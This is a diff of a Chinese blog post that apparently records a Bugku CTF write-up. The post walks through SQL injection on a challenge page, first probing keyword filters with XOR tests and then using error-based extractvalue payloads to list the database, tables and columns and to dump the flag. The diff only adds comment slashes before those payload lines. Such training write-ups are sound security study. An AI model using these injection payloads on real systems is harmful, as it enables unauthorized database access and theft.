@@ -383,10 +383,10 @@
 <p>这道题还是不错的，了解了xff延时注入，写脚本也多了一种思路。</p>
 <p>五、这是一个神奇的登陆框<br>挂了。</p>
 <p>六、多次<br>页面没有任何信息，url中有id，加上’报错，猜测是sql注入。<br>id=1’or 1=1–+ 也报错，可能存在过滤<br>用异或注入测一下过滤了啥，<br>例：?id=1’^(length(‘union’)!=0)–+,如果返回页面显示正常，那就证明length(‘union’)==0的，也就是union被过滤了。同理测试出被过滤的字符串有：and，or，union，select。<br>oorrder by测出来两个字段，接下来就是爆了。<br>基本操作就不写了，直接说结果：<br>表flag1,hint，<br>字段flag1,address<br>flag1中的数据不是flag，在address里找到了下一关的链接：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200715234331.png" alt=""><br>感觉和上次whuctf的那个sql一样，都是输入什么回显什么。。。当时用的是盲注。<br>看了一下wp。<br>当双写绕过和大小写绕过都没用时，这时我们需要用到报错注入。<br>报错注入介绍：<a href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a></p>
-<p>爆库<br><a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,database(),0x7e)))–+</p>
-<p>爆表<br><a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(table_name) from information_schema.tables<br>where table_schema=”web1002-2”),0x7e)))–+</p>
-<p>爆列<br><a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(column_name) from information_schema.columns<br>where table_schema=”web1002-2” and table_name=”flag2”),0x7e)))–+</p>
-<p>爆flag<br><a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(flag2) from flag2),0x7e)))–+</p>
+<p>爆库<br>//<a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,database(),0x7e)))–+</p>
+<p>爆表<br>//<a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(table_name) from information_schema.tables<br>where table_schema=”web1002-2”),0x7e)))–+</p>
+<p>爆列<br>//<a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(column_name) from information_schema.columns<br>where table_schema=”web1002-2” and table_name=”flag2”),0x7e)))–+</p>
+<p>爆flag<br>//<a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(flag2) from flag2),0x7e)))–+</p>
 <p>flag{Bugku-sql_6s-2i-4t-bug}</p>
 <p>奇怪的sql知识增加了！</p>
 <p>另：这一周有点水，下一周要大大增加学习量。</p>
